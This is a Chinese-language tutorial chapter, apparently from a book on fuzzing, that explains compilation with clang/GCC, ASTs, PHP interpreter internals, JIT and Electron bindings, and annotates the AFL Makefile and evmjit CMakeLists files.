<li><a href="5.compile.html#interpreter-%E8%84%9A%E6%9C%AC%E8%A7%A3%E6%9E%90%E5%99%A8">Interpreter 脚本解析器</a></li>
<li><a href="5.compile.html#jit-just-in-time%E6%8A%80%E6%9C%AF">JIT (Just-in-Time)技术</a></li>
<li><a href="5.compile.html#binding-%E5%8E%9F%E7%90%86">Binding 原理</a></li>
</ul>
</li>
<li><a href="5.compile.html#linux-%E4%B8%8B%E7%9A%84%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B">Linux 下的编译过程</a>
<ul>
<li><a href="5.compile.html#makefile">Makefile</a></li>
<li><a href="5.compile.html#%E9%92%88%E5%AF%B9%E5%B9%B3%E5%8F%B0%E7%94%9F%E6%88%90makefile">针对平台生成Makefile</a>
<ul>
<li><a href="5.compile.html#cmake">cmake</a></li>
<li><a href="5.compile.html#configure">configure</a></li>
</ul>
</li>
<li><a href="5.compile.html#%E7%BC%96%E8%AF%91%E5%8F%82%E6%95%B0%E5%BC%95%E5%85%A5">编译参数引入</a>
<ul>
<li><a href="5.compile.html#%E7%94%9F%E6%88%90makefile-%E9%98%B6%E6%AE%B5">生成Makefile 阶段</a></li>
<li><a href="5.compile.html#make-%E9%98%B6%E6%AE%B5">make 阶段</a></li>
</ul>
</li>
<li><a href="5.compile.html#%E7%BC%BA%E5%B0%91%E7%B3%BB%E7%BB%9F%E4%BE%9D%E8%B5%96%E5%BA%93">缺少系统依赖库</a></li>
<li><a href="5.compile.html#%E6%80%BB%E7%BB%93">总结</a></li>
</ul>
</li>
</ul>
<h2 id="必备工具-4"><a class="header" href="#必备工具-4">必备工具</a></h2>
<p>clang ,Python</p>
<h2 id="二进制编译原理"><a class="header" href="#二进制编译原理">二进制编译原理</a></h2>
<p>本节深入理解编译原理的各个部分,旨在于了解程序编译过程中编译器或脚本解析器做了哪些事情和实现细节,如果我们要在编译过程中进行Fuzzing 应该要怎么做.</p>
<p>我们知道,计算机的CPU 通过执行二进制的代码来计算程序的结果.人类编写的各种计算机语言,事实上是人类对语言的约定,我们应该要按照这种办法来编写代码,程序也应该按照人类的规划的方式来执行.这些文本代码经过编译器编译后,会翻译成机器可以执行的二进制代码,期间编译器做的工作包括:语法分析,对代码构建抽象语法树,编译成目标平台的汇编代码,链接生成程序.接下来就用clang 来一步步分析.</p>
<p>clang 是基于LLVM 的编译器,编译时的过程如下:</p>
<p><img src="pic5/pic1.png" alt="pic5/pic1.png" /></p>
<ol>
<li>Clang Frontend(Clang 前端)部分主要的工作是对代码进行序列化为抽象语法树再编译成LLVM IR</li>
<li>LLVM Optimizer(LLVM 优化器)对LLVM IR 进行优化或者混淆,接下来每个.c /.cpp 文件就会成为.o 文件</li>
<li>LLVM Linker 对编译出来的.o 文件进行链接,合并所有.o 的代码并引入这些代码所需要的静态库代码和动态链接库的函数符号</li>
<li>最后根据目的平台的架构进行代码生成,输出二进制文件.</li>
</ol>
<p>同样的原理深入GCC 的编译过程:</p>
<ol>
<li>GCC 首先调用<strong>cpp</strong> 把.c/.cpp 的宏处理好,生成.i 文件</li>
<li>把预处理过后的.i 文件传递给<strong>cc</strong> 来编译汇编代码到.s 文件</li>
<li>然后GCC 把汇编文件传递给<strong>as</strong> 生成.o 文件</li>
<li>最后通过<strong>ld</strong> 来链接所有的.o 文件输出可执行程序</li>
</ol>
<h3 id="ast-抽象语法树"><a class="header" href="#ast-抽象语法树">AST (抽象语法树)</a></h3>
<p>在编译器前端对文本代码进行解析时,目的就是为了对程序代码生成程序可以处理的树状结构,称之为抽象语法树.下面是一个例子:</p>
<pre><code class="language-c">
#include &lt;stdio.h&gt;

int main(int argc,char** argv) {
    int number = 1;

    number += 2;

    printf(&quot;Number=%d\n&quot;,number);

    return 0;
}

</code></pre>
<p>我们可以使用Clang 对上面的代码生成AST ,命令如下</p>
<pre><code class="language-shell">
clang -Xclang -ast-dump -fsyntax-only exmaple.c

</code></pre>
<p>输出的结果较多,在此只取一部分显示结果</p>
<p><img src="pic5/pic2.png" alt="" /></p>
<p>在Python 下我们可以使用内置的AST 库来对代码构建抽象语法树</p>
<pre><code class="language-python">
import ast

node = ast.parse('a = 1')

ast.dump(node)

</code></pre>
<p>在 <code>ast.dump()</code> 输出下可以看到JSON 格式的AST 树数据</p>
<pre><code class="language-txt">
&gt;&gt;&gt; ast.dump(node)
&quot;Module(body=[Assign(targets=[Name(id='a', ctx=Store())], value=Num(n=1))])&quot;

</code></pre>
<p>文本代码经过序列化之后,那么编译器接下来就可以使用抽象语法树作为数据结构来进行编译操作了.除了编译之外,做自动化白盒审计也是用到AST 来对数据流和控制流进行分析,具体细节下一章再详细分析.</p>
<h3 id="汇编"><a class="header" href="#汇编">汇编</a></h3>
<p>到了汇编阶段,Clang 和GCC 的实现会稍微有点不同之处.</p>
<p>对于Clang 来说,汇编阶段是生成LLVM IR 代码,在链接时才针对目标架构进行汇编,我们使用下面这个命令来观察LLVM IR</p>
<pre><code class="language-shell">
clang -S -emit-llvm ./exmaple.c
cat ./exmaple.ll

</code></pre>
<p>对应输出的LLVM IR 代码如下</p>
<p><img src="pic5/pic3.png" alt="" /></p>
<p>对于GCC 来说,汇编阶段已经生成针对目标架构生成了汇编代码,使用这个命令来观察GCC 汇编</p>
<pre><code class="language-shell">
gcc -S ./example.c
cat ./example.s

</code></pre>
<p><img src="pic5/pic4.png" alt="" /></p>
<h3 id="链接"><a class="header" href="#链接">链接</a></h3>
<p>在最后链接输出二进制程序阶段,<strong>ld</strong> 把各个.o 文件和需要引用到的静态库引入打包生产二进制文件,二进制编译全过程如下图</p>
<p><img src="pic5/pic5.png" alt="" /></p>
<h2 id="脚本语言运行原理"><a class="header" href="#脚本语言运行原理">脚本语言运行原理</a></h2>
<p>脚本语言运行原理和二进制运行原理有很大的不同之处,后者是直接通过CPU 可以执行的二进制代码来运行,脚本则是需要依赖一个程序来解析执行.下面以微软的JavaScript 引擎ChakraCode 作为剖析,先来看看ChakraCode 架构图:</p>
<p><img src="pic5/pic6.jpg" alt="" /></p>
<p>浏览器中执行的JavaScript ,实际上是把JavaScript 代码传递给ChakraCode 来解析执行,ChakraCode 在运行时有一个上下文对象,我们根据这个对象来操作当前JavaScript 的全局对象和局部对象,也通过这个对象来区分不同的浏览器标签的JavaScript 执行空间.首先JavaScript 代码经过<strong>Parser</strong> 解析完成代码之后,编译成Chakra OpCode 代码流传递到<strong>Interpreter</strong> 中执行,也可以编译成二进制代码又<strong>JIT</strong> 执行.JavaScript 中的对象都由GC (<strong>Garbage Collector</strong> 垃圾回收器)处理,负责申请和清除对象所使用的内存空间.如果JavaScript 需要调用到一些底层的接口(比如操作socket),那这些接口的Binding 就在<strong>Lowerer</strong> 中实现.</p>
<h3 id="interpreter-脚本解析器"><a class="header" href="#interpreter-脚本解析器">Interpreter 脚本解析器</a></h3>
<p>脚本解析器的作用是对OpCode 进行解析执行,意义为实现软件层的CPU ,执行脚本代码.这里以PHP 作为分析,代码位置(https://github.com/php/php-src/blob/623911f993f39ebbe75abe2771fc89faf6b15b9b/Zend/zend_ast.c#L449)</p>
<pre><code class="language-c">
ZEND_API int ZEND_FASTCALL zend_ast_evaluate(zval *result, zend_ast *ast, zend_class_entry *scope)
{
	zval op1, op2;
	int ret = SUCCESS;

	switch (ast-&gt;kind) {
		case ZEND_AST_BINARY_OP:  //  如果当前节点在AST 中为OpCode 类型,那就执行
			if (UNEXPECTED(zend_ast_evaluate(&amp;op1, ast-&gt;child[0], scope) != SUCCESS)) {
				ret = FAILURE;
			} else if (UNEXPECTED(zend_ast_evaluate(&amp;op2, ast-&gt;child[1], scope) != SUCCESS)) {
				zval_ptr_dtor_nogc(&amp;op1);
				ret = FAILURE;
			} else {
				binary_op_type op = get_binary_op(ast-&gt;attr);  //  根据指令来获取对应的执行回调函数
				ret = op(result, &amp;op1, &amp;op2);  //  执行指令处理的回调函数
				zval_ptr_dtor_nogc(&amp;op1);
				zval_ptr_dtor_nogc(&amp;op2);
			}
			break;

//  省略无关代码

</code></pre>
<p>再来看get_binary_op() 的函数代码,就是用一个大switch case 来返回回调函数指针(https://github.com/php/php-src/blob/0a6f85dbb3da5671a42c6034ab89db8ef4c6f23d/Zend/zend_opcode.c#L1017)</p>
<pre><code class="language-c">
ZEND_API binary_op_type get_binary_op(int opcode)
{
	switch (opcode) {
		case ZEND_ADD:
		case ZEND_ASSIGN_ADD:
			return (binary_op_type) add_function;
		case ZEND_SUB:
		case ZEND_ASSIGN_SUB:
			return (binary_op_type) sub_function;
		case ZEND_MUL:
		case ZEND_ASSIGN_MUL:
			return (binary_op_type) mul_function;
// ...

</code></pre>
<h3 id="jit-just-in-time技术"><a class="header" href="#jit-just-in-time技术">JIT (Just-in-Time)技术</a></h3>
<p>JIT 的意义是为了加快脚本文件的执行,在编译阶段不编译成OpCode 而是编译成机器代码执行,这样就不需要用Interpreter 来解析OpCode 从而提高更多的性能.谈到JIT 在此要提到一些二进制分析工具,譬如Triton (https://github.com/JonathanSalwan/Triton),unicorn (http://www.unicorn-engine.org).这些工具是把二进制机器码抽象出来,放到专门的解析器中来执行(这样做就可以实现跨平台执行,比如说当前CPU 架构是x64 ,它可以直接x64 和x86 ,但是不可以执行ARM ,这就需要一个模拟器(emulator)来模拟ARM CPU 执行).</p>
<h3 id="binding-原理"><a class="header" href="#binding-原理">Binding 原理</a></h3>
<p>Binding 的意义为底层写好的接口需要提供到上层来被调用,在解析器部分来说就是绑定内部函数对象到二进制函数代码位置.我们以electron 作为示例来讲解,先来看看渲染进程的ipcRendererInternal 的实现(https://github.com/electron/electron/blob/master/lib/renderer/ipc-renderer-internal.ts)</p>
<pre><code class="language-typescript">
const binding = process.atomBinding('ipc')
const v8Util = process.atomBinding('v8_util')

// Created by init.js.
export const ipcRendererInternal: Electron.IpcRendererInternal = v8Util.getHiddenValue(global, 'ipc-internal')
const internal = true

ipcRendererInternal.send = function (channel, ...args) {
  return binding.send(internal, channel, args)
}

ipcRendererInternal.sendSync = function (channel, ...args) {
  return binding.sendSync(internal, channel, args)[0]
}

ipcRendererInternal.sendTo = function (webContentsId, channel, ...args) {
  return binding.sendTo(internal, false, webContentsId, channel, args)
}

ipcRendererInternal.sendToAll = function (webContentsId, channel, ...args) {
  return binding.sendTo(internal, true, webContentsId, channel, args)
}

</code></pre>
<p>可以看到,bingding 对象是由electron 封装好的ipc 接口,对应的实现代码在atom_api_rendere_ipc.cc(https://github.com/electron/electron/blob/master/atom/renderer/api/atom_api_renderer_ipc.cc)</p>
<pre><code class="language-c++">
//  省略无关代码

void Send(mate::Arguments* args,
          bool internal,
          const std::string&amp; channel,
          const base::ListValue&amp; arguments) {
  RenderFrame* render_frame = GetCurrentRenderFrame();
  if (render_frame == nullptr)
    return;

  bool success = render_frame-&gt;Send(new AtomFrameHostMsg_Message(
      render_frame-&gt;GetRoutingID(), internal, channel, arguments));

  if (!success)
    args-&gt;ThrowError(&quot;Unable to send AtomFrameHostMsg_Message&quot;);
}

//  省略无关代码

void Initialize(v8::Local&lt;v8::Object&gt; exports,
                v8::Local&lt;v8::Value&gt; unused,
                v8::Local&lt;v8::Context&gt; context,
                void* priv) {
  mate::Dictionary dict(context-&gt;GetIsolate(), exports);
  dict.SetMethod(&quot;send&quot;, &amp;Send);  //  在指定上下文中的exports 对象中设置send 函数的底层实现
  //  省略无关代码
}

</code></pre>
<h2 id="linux-下的编译过程"><a class="header" href="#linux-下的编译过程">Linux 下的编译过程</a></h2>
<p>对于程序的编译步骤上面已经提及了,那么我们用些示例程序来讲述各种编译工具的运行原理</p>
<h3 id="makefile"><a class="header" href="#makefile">Makefile</a></h3>
<p>我们用AFL Fuzzer 作为例子,ls 列出目录文件,可以看到项目路径有一个Makefile 文件.</p>
<p><img src="pic5/pic7.png" alt="" /></p>
<p>编译AFL 只需要在当前目录下进行<code>make</code> 命令即可对AFL Fuzzer 进行编译.</p>
<p><img src="pic5/pic8.png" alt="" /></p>
<p>在窗口的输出可以看到<code>make</code> 命令调用<code>cc</code> 命令执行了编译操作,把afl-xx.c 文件编译成二进制程序并执行测试操作.这些编译的命令都是已经写好保存在Makefile 文件里面的,我们用<code>cat</code> 命令来查看文件的内容.</p>
<pre><code class="language-shell">
fcdeMacBook-Pro-2:afl-2.52b fc$ cat Makefile
#
# american fuzzy lop - makefile
# -----------------------------
#
# Written and maintained by Michal Zalewski &lt;lcamtuf@google.com&gt;
#
# Copyright 2013, 2014, 2015, 2016, 2017 Google Inc. All rights reserved.
#
# Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at:
#
#   http://www.apache.org/licenses/LICENSE-2.0
#

#  ---=== 设置环境变量 ===---
PROGNAME    = afl
VERSION     = $(shell grep '^\#define VERSION ' config.h | cut -d '&quot;' -f2)

PREFIX     ?= /usr/local
BIN_PATH    = $(PREFIX)/bin
HELPER_PATH = $(PREFIX)/lib/afl
DOC_PATH    = $(PREFIX)/share/doc/afl
MISC_PATH   = $(PREFIX)/share/afl

# PROGS intentionally omit afl-as, which gets installed elsewhere.

PROGS       = afl-gcc afl-fuzz afl-showmap afl-tmin afl-gotcpu afl-analyze
SH_PROGS    = afl-plot afl-cmin afl-whatsup

CFLAGS     ?= -O3 -funroll-loops
CFLAGS     += -Wall -D_FORTIFY_SOURCE=2 -g -Wno-pointer-sign \
              -DAFL_PATH=\&quot;$(HELPER_PATH)\&quot; -DDOC_PATH=\&quot;$(DOC_PATH)\&quot; \
              -DBIN_PATH=\&quot;$(BIN_PATH)\&quot;
#  ---=== 根据当前Linux 环境进行编译调整 ===---
ifneq &quot;$(filter Linux GNU%,$(shell uname))&quot; &quot;&quot;
  LDFLAGS  += -ldl
endif

ifeq &quot;$(findstring clang, $(shell $(CC) --version 2&gt;/dev/null))&quot; &quot;&quot;
  TEST_CC   = afl-gcc
else
  TEST_CC   = afl-clang
endif

COMM_HDR    = alloc-inl.h config.h debug.h types.h
#  ---=== make 命令选择项目 ===---
#  如果是make all ,那就调用到all: 这个地方开始,如果是make afl-gcc 就从afl-gcc 开始
#  make all 这里包含afl-gcc afl-fuzz afl-showmap afl-tmin afl-gotcpu afl-analyze (注意看PROGS 环境变量中指定了内容)afl-as
#  然后继续往下调用这些项目中指定的命令
all: test_x86 $(PROGS) afl-as test_build all_done

ifndef AFL_NO_X86

test_x86:
        @echo &quot;[*] Checking for the ability to compile x86 code...&quot;
        @echo 'main() { __asm__(&quot;xorb %al, %al&quot;); }' | $(CC) -w -x c - -o .test || ( echo; echo &quot;Oops, looks like your compiler can't generate x86 code.&quot;; echo; echo &quot;Don't panic! You can use the LLVM or QEMU mode, but see docs/INSTALL first.&quot;; echo &quot;(To ignore this error, set AFL_NO_X86=1 and try again.)&quot;; echo; exit 1 )
        @rm -f .test
        @echo &quot;[+] Everything seems to be working, ready to compile.&quot;

else

test_x86:
        @echo &quot;[!] Note: skipping x86 compilation checks (AFL_NO_X86 set).&quot;

endif

afl-gcc: afl-gcc.c $(COMM_HDR) | test_x86
        $(CC) $(CFLAGS) $@.c -o $@ $(LDFLAGS)
        set -e; for i in afl-g++ afl-clang afl-clang++; do ln -sf afl-gcc $$i; done

afl-as: afl-as.c afl-as.h $(COMM_HDR) | test_x86
        $(CC) $(CFLAGS) $@.c -o $@ $(LDFLAGS)
        ln -sf afl-as as

afl-fuzz: afl-fuzz.c $(COMM_HDR) | test_x86
        $(CC) $(CFLAGS) $@.c -o $@ $(LDFLAGS)

afl-showmap: afl-showmap.c $(COMM_HDR) | test_x86
        $(CC) $(CFLAGS) $@.c -o $@ $(LDFLAGS)

afl-tmin: afl-tmin.c $(COMM_HDR) | test_x86
        $(CC) $(CFLAGS) $@.c -o $@ $(LDFLAGS)

afl-analyze: afl-analyze.c $(COMM_HDR) | test_x86
        $(CC) $(CFLAGS) $@.c -o $@ $(LDFLAGS)

afl-gotcpu: afl-gotcpu.c $(COMM_HDR) | test_x86
        $(CC) $(CFLAGS) $@.c -o $@ $(LDFLAGS)

ifndef AFL_NO_X86

test_build: afl-gcc afl-as afl-showmap
        @echo &quot;[*] Testing the CC wrapper and instrumentation output...&quot;
        unset AFL_USE_ASAN AFL_USE_MSAN; AFL_QUIET=1 AFL_INST_RATIO=100 AFL_PATH=. ./$(TEST_CC) $(CFLAGS) test-instr.c -o test-instr $(LDFLAGS)
        echo 0 | ./afl-showmap -m none -q -o .test-instr0 ./test-instr
        echo 1 | ./afl-showmap -m none -q -o .test-instr1 ./test-instr
        @rm -f test-instr
        @cmp -s .test-instr0 .test-instr1; DR=&quot;$$?&quot;; rm -f .test-instr0 .test-instr1; if [ &quot;$$DR&quot; = &quot;0&quot; ]; then echo; echo &quot;Oops, the instrumentation does not seem to be behaving correctly!&quot;; echo; echo &quot;Please ping &lt;lcamtuf@google.com&gt; to troubleshoot the issue.&quot;; echo; exit 1; fi
        @echo &quot;[+] All right, the instrumentation seems to be working!&quot;

else

test_build: afl-gcc afl-as afl-showmap
        @echo &quot;[!] Note: skipping build tests (you may need to use LLVM or QEMU mode).&quot;

endif

all_done: test_build
        @if [ ! &quot;`which clang 2&gt;/dev/null`&quot; = &quot;&quot; ]; then echo &quot;[+] LLVM users: see llvm_mode/README.llvm for a faster alternative to afl-gcc.&quot;; fi
        @echo &quot;[+] All done! Be sure to review README - it's pretty short and useful.&quot;
        @if [ &quot;`uname`&quot; = &quot;Darwin&quot; ]; then printf &quot;\nWARNING: Fuzzing on MacOS X is slow because of the unusually high overhead of\nfork() on this OS. Consider using Linux or *BSD. You can also use VirtualBox\n(virtualbox.org) to put AFL inside a Linux or *BSD VM.\n\n&quot;; fi
        @! tty &lt;&amp;1 &gt;/dev/null || printf &quot;\033[0;30mNOTE: If you can read this, your terminal probably uses white background.\nThis will make the UI hard to read. See docs/status_screen.txt for advice.\033[0m\n&quot; 2&gt;/dev/null

.NOTPARALLEL: clean

clean:
        rm -f $(PROGS) afl-as as afl-g++ afl-clang afl-clang++ *.o *~ a.out core core.[1-9][0-9]* *.stackdump test .test test-instr .test-instr0 .test-instr1 qemu_mode/qemu-2.10.0.tar.bz2 afl-qemu-trace
        rm -rf out_dir qemu_mode/qemu-2.10.0
        $(MAKE) -C llvm_mode clean
        $(MAKE) -C libdislocator clean
        $(MAKE) -C libtokencap clean

install: all
        mkdir -p -m 755 $${DESTDIR}$(BIN_PATH) $${DESTDIR}$(HELPER_PATH) $${DESTDIR}$(DOC_PATH) $${DESTDIR}$(MISC_PATH)
        rm -f $${DESTDIR}$(BIN_PATH)/afl-plot.sh
        install -m 755 $(PROGS) $(SH_PROGS) $${DESTDIR}$(BIN_PATH)
        rm -f $${DESTDIR}$(BIN_PATH)/afl-as
        if [ -f afl-qemu-trace ]; then install -m 755 afl-qemu-trace $${DESTDIR}$(BIN_PATH); fi
ifndef AFL_TRACE_PC
        if [ -f afl-clang-fast -a -f afl-llvm-pass.so -a -f afl-llvm-rt.o ]; then set -e; install -m 755 afl-clang-fast $${DESTDIR}$(BIN_PATH); ln -sf afl-clang-fast $${DESTDIR}$(BIN_PATH)/afl-clang-fast++; install -m 755 afl-llvm-pass.so afl-llvm-rt.o $${DESTDIR}$(HELPER_PATH); fi
else
        if [ -f afl-clang-fast -a -f afl-llvm-rt.o ]; then set -e; install -m 755 afl-clang-fast $${DESTDIR}$(BIN_PATH); ln -sf afl-clang-fast $${DESTDIR}$(BIN_PATH)/afl-clang-fast++; install -m 755 afl-llvm-rt.o $${DESTDIR}$(HELPER_PATH); fi
endif
        if [ -f afl-llvm-rt-32.o ]; then set -e; install -m 755 afl-llvm-rt-32.o $${DESTDIR}$(HELPER_PATH); fi
        if [ -f afl-llvm-rt-64.o ]; then set -e; install -m 755 afl-llvm-rt-64.o $${DESTDIR}$(HELPER_PATH); fi
        set -e; for i in afl-g++ afl-clang afl-clang++; do ln -sf afl-gcc $${DESTDIR}$(BIN_PATH)/$$i; done
        install -m 755 afl-as $${DESTDIR}$(HELPER_PATH)
        ln -sf afl-as $${DESTDIR}$(HELPER_PATH)/as
        install -m 644 docs/README docs/ChangeLog docs/*.txt $${DESTDIR}$(DOC_PATH)
        cp -r testcases/ $${DESTDIR}$(MISC_PATH)
        cp -r dictionaries/ $${DESTDIR}$(MISC_PATH)

publish: clean
        test &quot;`basename $$PWD`&quot; = &quot;afl&quot; || exit 1
        test -f ~/www/afl/releases/$(PROGNAME)-$(VERSION).tgz; if [ &quot;$$?&quot; = &quot;0&quot; ]; then echo; echo &quot;Change program version in config.h, mmkay?&quot;; echo; exit 1; fi
        cd ..; rm -rf $(PROGNAME)-$(VERSION); cp -pr $(PROGNAME) $(PROGNAME)-$(VERSION); \
          tar -cvz -f ~/www/afl/releases/$(PROGNAME)-$(VERSION).tgz $(PROGNAME)-$(VERSION)
        chmod 644 ~/www/afl/releases/$(PROGNAME)-$(VERSION).tgz
        ( cd ~/www/afl/releases/; ln -s -f $(PROGNAME)-$(VERSION).tgz $(PROGNAME)-latest.tgz )
        cat docs/README &gt;~/www/afl/README.txt
        cat docs/status_screen.txt &gt;~/www/afl/status_screen.txt
        cat docs/historical_notes.txt &gt;~/www/afl/historical_notes.txt
        cat docs/technical_details.txt &gt;~/www/afl/technical_details.txt
        cat docs/ChangeLog &gt;~/www/afl/ChangeLog.txt
        cat docs/QuickStartGuide.txt &gt;~/www/afl/QuickStartGuide.txt
        echo -n &quot;$(VERSION)&quot; &gt;~/www/afl/version.txt
fcdeMacBook-Pro-2:afl-2.52b fc$

</code></pre>
<p>项目的编译过程和细节用Makefile 写好,<code>make</code> 命令的用意是提供自动处理并执行Makefile 中的编译指令来生成程序代码.</p>
<h3 id="针对平台生成makefile"><a class="header" href="#针对平台生成makefile">针对平台生成Makefile</a></h3>
<p>Linux 系统衍生出了各种不同的版本,比如说Centos Ubuntu Android ,这些版本中可能会修改了内核和系统库的一些相关的数据结构或者运行环境.所以项目代码需要对这些各种不一样的Linux 系统进行预处理(查找系统库路径并引入,检查第三方依赖库版本等)然后生成Makefile .常用的方法有两种:</p>
<h4 id="cmake"><a class="header" href="#cmake">cmake</a></h4>
<p>判断一个项目中是否使用cmake ,我们看这个目录下是不是有CMakeLists.txt 文件,以evmjit (https://github.com/ethereum/evmjit)为例子:</p>
<p><img src="pic5/pic9.png" alt="" /></p>
<p>我们进入项目代码目录来查看,每个代码目录都会存在CMakeLists.txt 文件.</p>
<p><img src="pic5/pic10.png" alt="" /></p>
<p>回到项目根目录的CMakeLists.txt 文件来查看文件内容,分析如下:</p>
<pre><code class="language-cmake">
fcdeMacBook-Pro-2:evmjit fc$ cat CMakeLists.txt
cmake_minimum_required(VERSION 3.4.0)  #  指定CMake 最低版本

cmake_policy(SET CMP0042 OLD)   # Fix MACOSX_RPATH.
cmake_policy(SET CMP0048 NEW)   # Allow VERSION argument in project().
if (POLICY CMP0054)
        cmake_policy(SET CMP0054 NEW)   # No longer implicitly dereference variables.
endif()

set(CMAKE_CONFIGURATION_TYPES Debug Release RelWithDebInfo)

project(EVMJIT VERSION 0.9.0.2 LANGUAGES CXX C)

list(APPEND CMAKE_MODULE_PATH &quot;${CMAKE_CURRENT_LIST_DIR}/cmake&quot;)

message(STATUS &quot;EVM JIT ${EVMJIT_VERSION_MAJOR}.${EVMJIT_VERSION_MINOR}.${EVMJIT_VERSION_PATCH}&quot;)

if (NOT ${CMAKE_SYSTEM_PROCESSOR} MATCHES &quot;x86_64|AMD64&quot;)  #  判断当前平台的CPU 架构是不是intel/AMD 64 位
        message(FATAL_ERROR &quot;Target ${CMAKE_SYSTEM_PROCESSOR} not supported -- EVM JIT works only on x86_64 architecture&quot;)
endif()

option(EVMJIT_EXAMPLES &quot;Generate build targets for the EVMJIT examples&quot; OFF)  #  自定义CMake 编译选项
option(EVMJIT_TESTS &quot;Create targets for CTest&quot; OFF)

set_property(GLOBAL PROPERTY USE_FOLDERS ON)

if (CMAKE_CXX_COMPILER_ID STREQUAL &quot;MSVC&quot;)  #  Windows 平台编译需要引入的编译参数
        # Always use Release variant of C++ runtime.
        # We don't want to provide Debug variants of all dependencies. Some default
        # flags set by CMake must be tweaked.
        string(REPLACE &quot;/MDd&quot; &quot;/MD&quot; CMAKE_CXX_FLAGS_DEBUG ${CMAKE_CXX_FLAGS_DEBUG})
        string(REPLACE &quot;/D_DEBUG&quot; &quot;&quot; CMAKE_CXX_FLAGS_DEBUG ${CMAKE_CXX_FLAGS_DEBUG})
        string(REPLACE &quot;/RTC1&quot; &quot;&quot; CMAKE_CXX_FLAGS_DEBUG ${CMAKE_CXX_FLAGS_DEBUG})
        set_property(GLOBAL PROPERTY DEBUG_CONFIGURATIONS OFF)
else()                                      #  Linux / macOS 编译需要引入的编译参数
        set(CMAKE_CXX_FLAGS &quot;-std=c++11 -Wall -Wextra -Wconversion -Wno-sign-conversion -Wno-unknown-pragmas ${CMAKE_CXX_FLAGS}&quot;)
endif()

if (CMAKE_SYSTEM_NAME STREQUAL &quot;Linux&quot; AND NOT SANITIZE)
        # Do not allow unresolved symbols in shared library (default on linux)
        # unless sanitizer is used (sanity checks produce unresolved function calls)
        set(CMAKE_SHARED_LINKER_FLAGS &quot;-Wl,--no-undefined&quot;)
endif()

include(ProjectLLVM)
configure_llvm_project()

add_subdirectory(evmc)  #  添加代码目录

add_subdirectory(libevmjit)  #  添加代码目录

if (EVMJIT_TESTS)
        enable_testing()
        add_subdirectory(tests)
endif()

</code></pre>
<p>我们再来看看<code>libevmjit</code> 目录下的CMakeLists.txt 文件内容,这里指明的是如何对各个文件进行编译命令生成和引入依赖文件代码:</p>
<pre><code class="language-cmake">
fcdeMacBook-Pro-2:libevmjit fc$ cat CMakeLists.txt
get_filename_component(EVMJIT_INCLUDE_DIR ../include ABSOLUTE)

set(SOURCES     #  添加编译文件
        JIT.cpp                         JIT.h
        Arith256.cpp            Arith256.h
        Array.cpp                       Array.h
        BasicBlock.cpp          BasicBlock.h
        Cache.cpp                       Cache.h
                                                Common.h
        Compiler.cpp            Compiler.h
        CompilerHelper.cpp      CompilerHelper.h
        Endianness.cpp          Endianness.h
        ExecStats.cpp           ExecStats.h
        Ext.cpp                         Ext.h
        GasMeter.cpp            GasMeter.h
        Instruction.cpp         Instruction.h
        Memory.cpp                      Memory.h
        Optimizer.cpp           Optimizer.h
        RuntimeManager.cpp      RuntimeManager.h
        Type.cpp                        Type.h
        Utils.cpp                       Utils.h
)
source_group(&quot;&quot; FILES ${SOURCES})

if(CMAKE_CXX_COMPILER_ID STREQUAL &quot;MSVC&quot;)  #  判断Windows 平台
else()
        set(CMAKE_CXX_FLAGS &quot;${CMAKE_CXX_FLAGS} -fno-rtti -fvisibility=hidden&quot;)
        if(CMAKE_SYSTEM_NAME STREQUAL &quot;Linux&quot;)
                set(CMAKE_SHARED_LINKER_FLAGS &quot;${CMAKE_SHARED_LINKER_FLAGS} -Wl,--exclude-libs,ALL&quot;) # Do not export symbols from dependies, mostly LLVM libs
        endif()
endif()


string(COMPARE EQUAL &quot;${LLVM_ENABLE_ASSERTIONS}&quot; &quot;ON&quot; LLVM_DEBUG)
configure_file(BuildInfo.h.in ${CMAKE_CURRENT_BINARY_DIR}/gen/BuildInfo.gen.h)

add_library(evmjit ${SOURCES} gen/BuildInfo.gen.h)
# Explicit dependency on llvm to download LLVM header files.
add_dependencies(evmjit LLVM::JIT)  #  添加依赖文件
get_target_property(LLVM_COMPILE_DEFINITIONS LLVM::JIT INTERFACE_COMPILE_DEFINITIONS)
if (LLVM_COMPILE_DEFINITIONS)
        target_compile_definitions(evmjit PRIVATE ${LLVM_COMPILE_DEFINITIONS})
endif()
get_target_property(LLVM_INCLUDE_DIRECTORIES LLVM::JIT INTERFACE_INCLUDE_DIRECTORIES)
target_include_directories(evmjit SYSTEM PRIVATE ${LLVM_INCLUDE_DIRECTORIES})  #  添加头文件目录
target_include_directories(evmjit PRIVATE ${CMAKE_CURRENT_BINARY_DIR}/gen)
target_include_directories(evmjit PUBLIC ${EVMJIT_INCLUDE_DIR})

include(GNUInstallDirs)
install(TARGETS evmjit
                RUNTIME DESTINATION ${CMAKE_INSTALL_BINDIR}
                LIBRARY DESTINATION ${CMAKE_INSTALL_LIBDIR}
                ARCHIVE DESTINATION ${CMAKE_INSTALL_LIBDIR})
install(DIRECTORY ${EVMJIT_INCLUDE_DIR}/
                DESTINATION ${CMAKE_INSTALL_INCLUDEDIR})


# When building static lib add additional target evmjit-standalone --
# an archive containing all LLVM dependencies in a single file.
get_target_property(_evmjit_type evmjit TYPE)
if (_evmjit_type STREQUAL STATIC_LIBRARY)
        get_link_libraries(EVMJIT_LINK_LIBRARIES evmjit)
        set(EVMJIT_STANDALONE_FILE ${CMAKE_STATIC_LIBRARY_PREFIX}evmjit-standalone${CMAKE_STATIC_LIBRARY_SUFFIX})
        if (MSVC)
          #  ...
        elseif (APPLE)
                add_custom_command(OUTPUT ${EVMJIT_STANDALONE_FILE}  #  组装编译命令
                                                   COMMAND libtool -static -o ${EVMJIT_STANDALONE_FILE} $&lt;TARGET_FILE:evmjit&gt; ${EVMJIT_LINK_LIBRARIES}
                                                   VERBATIM)
                add_custom_target(evmjit-standalone DEPENDS ${EVMJIT_STANDALONE_FILE})
                install(FILES ${CMAKE_CURRENT_BINARY_DIR}/${EVMJIT_STANDALONE_FILE} DESTINATION ${CMAKE_INSTALL_LIBDIR} OPTIONAL)
        elseif (CMAKE_AR)
          #  ...
        endif()
endif()

</code></pre>
<p>CMake 的原理是,通过项目根目录的CMakeLists.txt 包含各子目录的CMakeLists.txt ,引入各种依赖目录和各平台的编译参数,最后生成一个Makefile .我们在项目的根目录使用<code>cmake .</code> 让cmake 对CMakeLists.txt 进行Makefile 生成.结果如下:</p>
<p><img src="pic5/pic11.png" alt="" /></p>
